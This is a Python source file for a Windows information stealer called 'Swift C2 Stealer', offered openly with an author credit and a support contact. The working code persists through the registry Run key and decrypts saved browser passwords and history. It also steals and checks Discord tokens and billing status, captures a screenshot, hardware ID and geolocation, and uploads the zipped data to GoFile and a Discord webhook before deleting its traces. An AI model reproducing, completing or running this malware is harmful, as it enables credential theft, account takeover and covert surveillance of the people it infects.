#coded by dex/d3xoncpvp
#for support add d3xonv3 on discord
#selling this src or project is prohibited

import os
import sqlite3
import json
import base64
import shutil
import requests
import platform
import re
import tempfile
import zipfile
import glob
import sys 
import winreg 
from PIL import ImageGrab 
from random import choices
from string import ascii_letters, digits 
from subprocess import Popen, PIPE 
from urllib.request import urlopen, Request 


try:
    from Cryptodome.Cipher import AES
except ImportError:
    print("Error: Cryptodome not found. Please install pycryptodome or pycryptodomex.")
    print("Run: pip install pycryptodomex")
    exit()

try:
    import win32crypt # Ensure this is available for CryptUnprotectData
except ImportError:
    print("Error: pywin32 not found. Please install it.")
    print("Run: pip install pywin32")
    exit()

try:
    import psutil
except ImportError:
    psutil = None

#put youre webhook here
DISCORD_WEBHOOK_URL = "youre fuck ass webhook in here"


GOFILE_API_URL = "https://store4.gofile.io/uploadFile"

# --- Configuration ---
MAX_TOKEN_EMBED_FIELDS = 10
OUTPUT_ZIP_NAME = "collected_data.zip"
EMBED_AUTHOR_NAME = "Swift C2 Stealer" 
EMBED_THUMBNAIL_URL = "https://cdn.discordapp.com/attachments/1362308519373836318/1374367817285111929/ezgif.com-animated-gif-maker_1.gif?ex=682dcb46&is=682c79c6&hm=9cbad8cd4492d0af38ef46ff30558549dffff78935219195eafd54d4471eb64b&" # Added thumbnail URL
STARTUP_REG_KEY_NAME = "SwiftC2Helper" 
# --- End Configuration ---

def add_to_startup():
    """Adds the script to Windows startup for the current user."""
    
    if getattr(sys, 'frozen', False): 
        script_path = sys.executable
    else: 
        script_path = os.path.realpath(__file__)

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_REG_KEY_NAME, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print(f"Successfully added to startup: {STARTUP_REG_KEY_NAME} -> {script_path}")
    except PermissionError:
        print(f"Permission denied: Could not add to startup. Try running as administrator if this is unexpected.")
    except FileNotFoundError:
        print(f"Error: Registry path not found: HKEY_CURRENT_USER\\{key_path}. Cannot add to startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")


def get_browser_key(browser_name):
    """Retrieves the browser's encryption key."""
    local_state_path = None
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")

    if browser_name == "chrome":
        local_state_path = os.path.join(local_appdata, "Google", "Chrome", "User Data", "Local State")
    elif browser_name == "edge":
        local_state_path = os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Local State")
    elif browser_name == "opera":
        local_state_path = os.path.join(appdata, "Opera Software", "Opera GX Stable", "Local State")
        if not os.path.exists(local_state_path): # Fallback for standard Opera
             local_state_path = os.path.join(appdata, "Opera Software", "Opera Stable", "Local State")
    elif browser_name == "brave":
        local_state_path = os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State")
    elif browser_name == "vivaldi":
        local_state_path = os.path.join(local_appdata, "Vivaldi", "User Data", "Local State")

    if not local_state_path or not os.path.exists(local_state_path):
        return None

    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key:
            return None

        key_bytes = base64.b64decode(encrypted_key)
        if key_bytes.startswith(b'DPAPI'): # Chrome version > 80
            key = key_bytes[5:]
        else: # Older Chrome versions might not have DPAPI prefix
            key = key_bytes
            
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        
        return None


def decrypt_password(password_payload, key):
    """Decrypts a browser password or similar AES-GCM encrypted payload."""
    if key is None:
        return "[Key not available]"
    try:
        iv = password_payload[3:15]
        ciphertext = password_payload[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_bytes = cipher.decrypt(ciphertext)[:-16] 
        return decrypted_bytes.decode(errors='ignore')
    except Exception as e:
        
        return "[Could not be decrypted]"


def get_browser_data(browser_name, data_type):
    """Extracts browser passwords or history."""
    data = []
    db_paths = {
        "passwords": "Login Data",
        "history": "History"
    }

    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    base_path_default_profile = None

    if browser_name == "chrome":
        base_path_default_profile = os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default")
    elif browser_name == "edge":
        base_path_default_profile = os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default")
    elif browser_name == "opera":
        base_path_default_profile = os.path.join(appdata, "Opera Software", "Opera GX Stable", "Default")
        if not os.path.exists(base_path_default_profile): # Fallback for standard Opera profile
             base_path_default_profile = os.path.join(appdata, "Opera Software", "Opera Stable", "Default")
    elif browser_name == "brave":
        base_path_default_profile = os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default")
    elif browser_name == "vivaldi":
        base_path_default_profile = os.path.join(local_appdata, "Vivaldi", "User Data", "Default")


    if not base_path_default_profile or not os.path.exists(base_path_default_profile):
        
        return None

    db_file_name = db_paths.get(data_type)
    if not db_file_name:
        return None

    db_path = os.path.join(base_path_default_profile, db_file_name)

    if not os.path.exists(db_path):
        
        return None

    temp_db = f"temp_{browser_name}_{data_type}_{os.getpid()}.db"
    conn = None
    try:
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        if data_type == "passwords":
            key = get_browser_key(browser_name)
            if key is None:
                data.append(f"[Skipping passwords for {browser_name}: Key not available]")
            else:
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url, username, encrypted_password_payload = row
                    if url and username and encrypted_password_payload:
                        decrypted_password = decrypt_password(encrypted_password_payload, key)
                        data.append(f"URL: {url}\nUser: {username}\nPass: {decrypted_password}\n---")

        elif data_type == "history":
            cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 200")
            data = [f"Title: {row[1]}\nURL: {row[0]}" for row in cursor.fetchall()]
            data = [item for item in data if item.strip() and "Title: \nURL: " not in item]

    except sqlite3.Error as e:
        
        return None
    except Exception as e:
        
        return None
    finally:
        if conn:
            conn.close()
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception: 
                pass
    return data


def steal_discord_tokens():
    """Steals Discord tokens from common locations."""
    roaming = os.getenv("APPDATA", "")
    local = os.getenv("LOCALAPPDATA", "")

    paths = { # Adjusted paths to User Data level for consistency where Local State is expected
        'Discord': os.path.join(roaming, 'discord'),
        'DiscordCanary': os.path.join(roaming, 'discordcanary'),
        'Lightcord': os.path.join(roaming, 'Lightcord'),
        'DiscordPTB': os.path.join(roaming, 'discordptb'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'OperaGX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
        'Amigo': os.path.join(local, 'Amigo', 'User Data'),
        'Torch': os.path.join(local, 'Torch', 'User Data'),
        'Kometa': os.path.join(local, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(local, 'Orbitum', 'User Data'),
        'CentBrowser': os.path.join(local, 'CentBrowser', 'User Data'),
        'SevenStar': os.path.join(local, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(local, 'Sputnik', 'Sputnik', 'User Data'),
        'Vivaldi_UserData': os.path.join(local, 'Vivaldi', 'User Data'), # Vivaldi User Data
        'Chrome_UserData': os.path.join(local, 'Google', 'Chrome', 'User Data'),
        'EpicPrivacyBrowser': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
        'Edge_UserData': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
        'Uran_UserData': os.path.join(local, 'uCozMedia', 'Uran', 'User Data'), # Uran User Data
        'Yandex_UserData': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'), # Yandex User Data
        'Brave_UserData': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Iridium_UserData': os.path.join(local, 'Iridium', 'User Data') # Iridium User Data
    }

    valid_tokens_with_info = []

    for app_name_key, user_data_path_prefix in paths.items():
        local_state_file_path = os.path.join(user_data_path_prefix, "Local State")

        if not os.path.exists(local_state_file_path):
            
            continue

        decryption_aes_key = None
        try:
            with open(local_state_file_path, "r", encoding="utf-8") as f:
                local_state_content = json.loads(f.read())
            encrypted_key_b64 = local_state_content.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key_b64:
                continue

            key_bytes_b64_decoded = base64.b64decode(encrypted_key_b64)
            dpapi_prefix_removed = key_bytes_b64_decoded[5:] 
            decryption_aes_key = win32crypt.CryptUnprotectData(dpapi_prefix_removed, None, None, None, 0)[1]
        except Exception: 
            continue

        if decryption_aes_key is None:
            continue
        
        
        
        potential_leveldb_paths = []
        if "discord" in app_name_key.lower() or app_name_key in ['Lightcord']: 
             potential_leveldb_paths.append(os.path.join(user_data_path_prefix, "Local Storage", "leveldb"))
        else: 
             potential_leveldb_paths.append(os.path.join(user_data_path_prefix, "Default", "Local Storage", "leveldb"))
             

        for leveldb_path in potential_leveldb_paths:
            if not os.path.exists(leveldb_path):
                
                continue

            current_app_tokens = []
            for file_name in os.listdir(leveldb_path):
                if not (file_name.endswith(".ldb") or file_name.endswith(".log")):
                    continue
                try:
                    with open(os.path.join(leveldb_path, file_name), "r", errors="ignore") as f:
                        for line_content in f.readlines():
                            line_content = line_content.strip()
                            for match in re.findall(r"dQw4w9WgXcQ:[^\"]*|mfa\.[^\"]*", line_content):
                                if match not in current_app_tokens :
                                    current_app_tokens.append(match)
                except PermissionError:
                    continue
                except Exception: 
                    continue
            
            for token_candidate in current_app_tokens:
                decrypted_token = None
                if token_candidate.startswith("dQw4w9WgXcQ:"):
                    try:
                        encrypted_payload_b64 = token_candidate.split('dQw4w9WgXcQ:')[1]
                        encrypted_payload_bytes = base64.b64decode(encrypted_payload_b64)
                        decrypted_token = decrypt_password(encrypted_payload_bytes, decryption_aes_key)
                        if "[Could not be decrypted]" in decrypted_token or "[Key not available]" in decrypted_token:
                            decrypted_token = None
                    except Exception: # nosec B110
                        decrypted_token = None
                elif token_candidate.startswith("mfa."):
                    if re.match(r"mfa\.[a-zA-Z0-9_\-]{80,}", token_candidate):
                        decrypted_token = token_candidate
                elif re.match(r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27,38}", token_candidate):
                    decrypted_token = token_candidate

                if decrypted_token and decrypted_token not in valid_tokens_with_info:
                    headers = {'Authorization': decrypted_token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                    try:
                        res = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers, timeout=5)
                        if res.status_code == 200:
                            valid_tokens_with_info.append(decrypted_token)
                    except requests.exceptions.RequestException:
                        continue
            if valid_tokens_with_info and leveldb_path == potential_leveldb_paths[0]: 
                break 


    return valid_tokens_with_info if valid_tokens_with_info else ["[No Discord tokens found]"]


def get_system_info():
    """Gathers basic and optional detailed system information."""
    info = platform.uname()
    system_info = f"Operating System: {info.system} {info.release} ({info.version})\n"
    system_info += f"Computer Name: {info.node}\n"
    system_info += f"Architecture: {info.machine}\n"
    system_info += f"Processor: {info.processor}\n"

    if psutil:
        try:
            total_ram_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)
            system_info += f"RAM: {total_ram_gb} GB\n"
        except Exception: 
            system_info += "Note: Error getting RAM info with psutil.\n"
    else:
        system_info += "Note: psutil not installed for more detailed info.\n"
    return system_info


def get_screenshot(path):
    scrn_path = os.path.join(
        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
    )
    try:
        ImageGrab.grab().save(scrn_path)
        return scrn_path
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None


def get_hwid():
    try:
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE) # nosec
        output, _ = p.communicate()
        lines = output.decode(errors='ignore').split("\n")
        if len(lines) > 1 and lines[1].strip():
            return lines[1].strip()
        else:
            return "HWID not found - WMIC Output Error"
    except Exception as e:
        print(f"Error getting HWID: {e}")
        return "HWID not found - Exception"


def get_user_data(tk):
    headers = {"Authorization": tk, "Content-Type": "application/json", 'User-Agent': 'Mozilla/5.0'}
    try:
        response = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers, timeout=5).json()
        username = f"{response.get('username', 'N/A')}#{response.get('discriminator', 'N/A')}"
        email = response.get('email', 'N/A')
        phone = response.get('phone', 'N/A')
        badges_value = ""
        flags = response.get('flags', 0)
        if flags & (1 << 0): badges_value += "Discord Employee, "
        if flags & (1 << 1): badges_value += "Partnered Server Owner, "
        if flags & (1 << 2): badges_value += "HypeSquad Events, "
        if flags & (1 << 3): badges_value += "Bug Hunter Level 1, "
        if flags & (1 << 6): badges_value += "House Bravery, "
        if flags & (1 << 7): badges_value += "House Brilliance, "
        if flags & (1 << 8): badges_value += "House Balance, "
        if flags & (1 << 9): badges_value += "Early Supporter, "
        if flags & (1 << 14): badges_value += "Bug Hunter Level 2, "
        if flags & (1 << 17): badges_value += "Early Verified Bot Developer, "
        if flags & (1 << 18): badges_value += "Discord Certified Moderator, "
        if not badges_value: badges_value = "None"
        else: badges_value = badges_value.rstrip(', ') + "."

        return {
            "username": username, "email": email, "phone": phone, "badges": badges_value,
            "avatar_url": f"https://cdn.discordapp.com/avatars/{response.get('id')}/{response.get('avatar')}.png" if response.get('avatar') else None,
            "nitro": bool(response.get("premium_type", 0) > 0)
        }
    except Exception: # nosec
        return {
            "username": "N/A", "email": "N/A", "phone": "N/A", "badges": "N/A", "avatar_url": None, "nitro": False
        }


def has_payment_methods(tk):
    headers = {"Authorization": tk, "Content-Type": "application/json", 'User-Agent': 'Mozilla/5.0'}
    try:
        response = requests.get(
            "https://discordapp.com/api/v9/users/@me/billing/payment-sources",
            headers=headers, timeout=5
        ).json()
        return "Yes" if response else "No"
    except Exception: # nosec
        return "N/A"


def get_Personal_data():
    ip_address = "No IP found -_-"
    country = "Country not found -_-"
    city = "City not found -_-"
    ip_services = ["https://api64.ipify.org", "https://ipv4.icanhazip.com", "https://api.ipify.org"]
    for service_url in ip_services:
        try:
            req = Request(service_url, headers={'User-Agent': 'Mozilla/5.0'})
            ip_address = urlopen(req, timeout=3).read().decode().strip()
            if ip_address and '.' in ip_address: # Basic IP format check
                break
            else:
                ip_address = "No IP found -_-" 
        except Exception: # nosec
            ip_address = "No IP found -_-"
            continue

    if ip_address and ip_address != "No IP found -_-":
        try:
            geo_req = Request(f"https://ipapi.co/{ip_address}/json/", headers={'User-Agent': 'Mozilla/5.0'})
            geo_data = json.loads(urlopen(geo_req, timeout=3).read().decode().strip())
            country = geo_data.get("country_name", "Country not found -_-")
            city = geo_data.get("city", "City not found -_-")
        except Exception: # nosec
            pass
    return {"ip_address": ip_address, "country": country, "city": city}


def upload_to_gofile(filepath):
    if not os.path.exists(filepath):
        print(f"Error: File not found for upload: {filepath}")
        return "Error: File not found"
    try:
        with open(filepath, 'rb') as f:
            response = requests.post(GOFILE_API_URL, files={'file': f}, timeout=30)
            response.raise_for_status()
            response_json = response.json()
            if response_json.get('status') == 'ok':
                return response_json.get('data', {}).get('downloadPage', 'Upload OK, no link')
            else:
                return f"Upload failed: {response_json.get('message', response_json.get('error', 'Unknown GoFile error'))}"
    except requests.exceptions.Timeout:
        return "Upload error: Timeout"
    except requests.exceptions.RequestException as e:
        return f"Upload error: {e}"
    except Exception as e:
        return f"Upload error: Unexpected - {e}"


def send_to_discord(title, description=None, fields=None, author_name=EMBED_AUTHOR_NAME, color=16711680, user_avatar_url=None):
    if not DISCORD_WEBHOOK_URL or DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" or "discord.com/api/webhooks" not in DISCORD_WEBHOOK_URL :
        print("Error: Discord webhook URL is not set or invalid.")
        return

    embed_content = {
        "title": title, "description": description, "color": color,
        "footer": {"text": "Data Exfiltration Report by Swift C2"},
        "author": {"name": author_name, "icon_url": None },
        "fields": fields if fields is not None else []
    }
    if user_avatar_url:
        embed_content["author"]["icon_url"] = user_avatar_url
        main_user_field = next((f for f in fields if f["name"] == "👤 User"), None)
        if main_user_field and main_user_field["value"] != "N/A":
            embed_content["author"]["name"] = f"{main_user_field['value']} | {EMBED_AUTHOR_NAME}"
    elif EMBED_THUMBNAIL_URL:
        embed_content["thumbnail"] = {"url": EMBED_THUMBNAIL_URL}

    embed = {
        "username": "Swift C2 Data Logger",
        "avatar_url": EMBED_THUMBNAIL_URL if EMBED_THUMBNAIL_URL else "https://i.imgur.com/p12K2Q9.png",
        "embeds": [embed_content]
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=embed, timeout=10)
        response.raise_for_status()
        print("Report sent to Discord successfully.")
    except requests.exceptions.Timeout:
        print("Discord webhook send timed out.")
    except requests.exceptions.RequestException as e:
        print(f"HTTP Request Error sending to Discord: {e}")
        if e.response is not None: print(f"Discord Response: {e.response.status_code} - {e.response.text}")
    except Exception as e:
        print(f"An unexpected error occurred while sending to Discord: {e}")


def main():
    add_to_startup() 

    total_passwords_stolen = 0
    user_avatar_for_embed = None
    collection_temp_dir_base = os.path.join(tempfile.gettempdir(), f"swift_c2_data_{os.getpid()}")
    if not os.path.exists(collection_temp_dir_base):
        try:
            os.makedirs(collection_temp_dir_base)
        except Exception as e:
            print(f"Error creating base temp directory {collection_temp_dir_base}: {e}")
            collection_temp_dir_base = tempfile.gettempdir()

    print(f"Using data collection directory: {collection_temp_dir_base}")

    print("Taking screenshot...")
    screenshot_path = get_screenshot(collection_temp_dir_base)
    if screenshot_path: print(f"Screenshot saved to: {screenshot_path}")
    else: print("Failed to take screenshot.")

    print("Getting HWID...")
    hwid = get_hwid()
    print(f"HWID: {hwid}")

    print("Getting personal IP and geolocation data...")
    personal_data = get_Personal_data()
    print(f"IP: {personal_data['ip_address']}, Country: {personal_data['country']}, City: {personal_data['city']}")

    print("Attempting to extract browser data...")
    browsers_to_scan = ["chrome", "edge", "opera", "brave", "vivaldi"] 
    for browser in browsers_to_scan:
        print(f"Extracting data from {browser}...")
        passwords_data = get_browser_data(browser, "passwords")
        history_data = get_browser_data(browser, "history")

        password_file_path = os.path.join(collection_temp_dir_base, f"{browser}_passwords.txt")
        if passwords_data and not (len(passwords_data) == 1 and "[Skipping passwords" in passwords_data[0]):
            with open(password_file_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser.capitalize()} Passwords ---\n\n")
                f.write("\n".join(passwords_data))
            actual_pw_count = sum(1 for p_entry in passwords_data if "URL:" in p_entry and "Pass: " in p_entry and "[Could not be decrypted]" not in p_entry and "[Key not available]" not in p_entry)
            total_passwords_stolen += actual_pw_count
            print(f"  Found {actual_pw_count} valid passwords for {browser}.")
        else:
            with open(password_file_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- No {browser.capitalize()} Passwords Found or Key Unavailable ---\n\n")
            print(f"  No passwords found or accessible for {browser}.")

        history_file_path = os.path.join(collection_temp_dir_base, f"{browser}_history.txt")
        if history_data and not (len(history_data) == 1 and "[No History found" in history_data[0]):
            with open(history_file_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser.capitalize()} History (Last 200) ---\n\n")
                f.write("\n".join(history_data))
            print(f"  Found {len(history_data)} history entries for {browser}.")
        else:
            with open(history_file_path, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- No {browser.capitalize()} History Found ---\n\n")
            print(f"  No history found for {browser}.")

    print("Attempting to steal Discord tokens...")
    discord_tokens = steal_discord_tokens()
    actual_tokens = [t for t in discord_tokens if t != "[No Discord tokens found]"]
    print(f"Found {len(actual_tokens)} verified Discord tokens.")

    discord_user_info_main = {}
    discord_payment_methods = "N/A"
    if actual_tokens:
        discord_user_info_main = get_user_data(actual_tokens[0])
        discord_payment_methods = has_payment_methods(actual_tokens[0])
        if discord_user_info_main.get("avatar_url"):
            user_avatar_for_embed = discord_user_info_main["avatar_url"]

    tokens_file_path = os.path.join(collection_temp_dir_base, "discord_data.txt")
    with open(tokens_file_path, "w", encoding="utf-8", errors="ignore") as f:
        f.write("--- Discord Information ---\n\n")
        if actual_tokens:
            f.write(f"Primary Account Info (from first token):\n")
            f.write(f"  Username: {discord_user_info_main.get('username', 'N/A')}\n")
            f.write(f"  Email: {discord_user_info_main.get('email', 'N/A')}\n")
            f.write(f"  Phone: {discord_user_info_main.get('phone', 'N/A')}\n")
            f.write(f"  Badges: {discord_user_info_main.get('badges', 'N/A')}\n")
            f.write(f"  Nitro: {'Yes' if discord_user_info_main.get('nitro') else 'No'}\n")
            f.write(f"  Payment Methods: {discord_payment_methods}\n\n")
            f.write(f"--- Found Tokens ({len(actual_tokens)}) ---\n")
            for tk_idx, tk_val in enumerate(actual_tokens):
                f.write(f"{tk_idx + 1}. {tk_val}\n")
                if tk_idx > 0 and tk_idx < 3:
                    extra_user_info = get_user_data(tk_val)
                    f.write(f"    User: {extra_user_info.get('username', 'N/A')}, Email: {extra_user_info.get('email', 'N/A')}\n")
        else:
            f.write("[No Discord tokens found or verified]\n")

    print("Gathering system information...")
    system_info_content = get_system_info()
    print("System info gathered.")
    system_info_file_path = os.path.join(collection_temp_dir_base, "system_info.txt")
    with open(system_info_file_path, "w", encoding="utf-8", errors="ignore") as f:
        f.write("--- System Information ---\n\n")
        f.write(system_info_content)
        f.write(f"\nHWID: {hwid}\n")



    output_zip_path_final = os.path.join(os.getcwd(), OUTPUT_ZIP_NAME)
    print(f"Zipping collected data into {output_zip_path_final}...")
    zip_created_successfully = False
    try:
        with zipfile.ZipFile(output_zip_path_final, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files_in_dir in os.walk(collection_temp_dir_base):
                for file_item in files_in_dir:
                    file_path_to_zip = os.path.join(root, file_item)
                    zipf.write(file_path_to_zip, os.path.relpath(file_path_to_zip, collection_temp_dir_base))
        print(f"Data successfully zipped to {output_zip_path_final}")
        zip_created_successfully = True
    except Exception as e:
        print(f"Error creating zip file: {e}")

    gofile_link = "Upload failed or skipped"
    if zip_created_successfully and os.path.exists(output_zip_path_final):
        print(f"Attempting to upload {OUTPUT_ZIP_NAME} to GoFile...")
        gofile_link = upload_to_gofile(output_zip_path_final)
        print(f"GoFile Link: {gofile_link}")
    elif not zip_created_successfully:
        print("Skipping GoFile upload because zip creation failed.")

    fields = []
    fields.append({"name": "👤 User", "value": discord_user_info_main.get('username', 'N/A'), "inline": True})
    fields.append({"name": "📧 Email", "value": discord_user_info_main.get('email', 'N/A'), "inline": True})
    fields.append({"name": "📱 Phone", "value": discord_user_info_main.get('phone', 'N/A'), "inline": True})
    fields.append({"name": "🔑 Token (Primary)", "value": f"```\n{actual_tokens[0] if actual_tokens else 'No Token Found'}\n```", "inline": False})
    fields.append({"name": "🌐 IP Address", "value": personal_data['ip_address'], "inline": True})
    fields.append({"name": "📍 Location", "value": f"{personal_data.get('city', 'N/A')}, {personal_data.get('country', 'N/A')}", "inline": True})
    fields.append({"name": "📛 Badges", "value": discord_user_info_main.get('badges', 'N/A'), "inline": True})
    fields.append({"name": "💎 Nitro", "value": "Yes" if discord_user_info_main.get('nitro') else "No", "inline": True})
    fields.append({"name": "💳 Billing", "value": discord_payment_methods, "inline": True})
    fields.append({"name": "🖥️ HWID", "value": f"`{hwid}`", "inline": True})

    sys_info_summary = platform.uname()
    sys_info_val = f"OS: {sys_info_summary.system} {sys_info_summary.release}\nPC: {sys_info_summary.node}"
    if psutil:
         try: sys_info_val += f"\nRAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"
         except: pass # nosec
    fields.append({"name": "💻 System", "value": sys_info_val, "inline": False})
    fields.append({"name": "🔒 Passwords Found", "value": f"Total passwords extracted: **{total_passwords_stolen}**", "inline": True})
   
    if len(actual_tokens) > 1:
        other_tokens_value = ""
        for i, token in enumerate(actual_tokens[1:MAX_TOKEN_EMBED_FIELDS]):
            other_tokens_value += f"`{token}`\n"
        if len(actual_tokens) > MAX_TOKEN_EMBED_FIELDS:
            other_tokens_value += f"\nAnd {len(actual_tokens) - MAX_TOKEN_EMBED_FIELDS} more token(s) in the uploaded file."
        if other_tokens_value:
             fields.append({"name": f"🔑 Other Tokens ({len(actual_tokens)-1})", "value": other_tokens_value.strip(), "inline": False})

    fields.append({
        "name": "📦 Collected Data Archive",
        "value": f"[Download Data]({gofile_link})" if gofile_link and "Error" not in gofile_link and "failed" not in gofile_link.lower() else f"Archive Link: {gofile_link}",
        "inline": False
    })
    if screenshot_path and os.path.exists(screenshot_path):
        fields.append({"name": "🖼️ Screenshot", "value": "Included in archive.", "inline": False})

    embed_title = "✨ Swift C2 Data Log ✨"
    embed_description = f"New data collection from **{discord_user_info_main.get('username', personal_data.get('ip_address', 'Unknown Target'))}**."
    send_to_discord(embed_title, description=embed_description, fields=fields, color=3066993, user_avatar_url=user_avatar_for_embed)

    print("Script finished. Cleaning up temporary files and zip.")
    if os.path.exists(collection_temp_dir_base):
        try:
            shutil.rmtree(collection_temp_dir_base)
            print(f"Cleaned up temporary directory: {collection_temp_dir_base}")
        except Exception as e:
            print(f"Error cleaning up temporary directory {collection_temp_dir_base}: {e}")

    if zip_created_successfully and os.path.exists(output_zip_path_final):
        try:
            os.remove(output_zip_path_final)
            print(f"Cleaned up zip file: {output_zip_path_final}")
        except Exception as e:
            print(f"Error cleaning up zip file {output_zip_path_final}: {e}")

if __name__ == "__main__":
    main()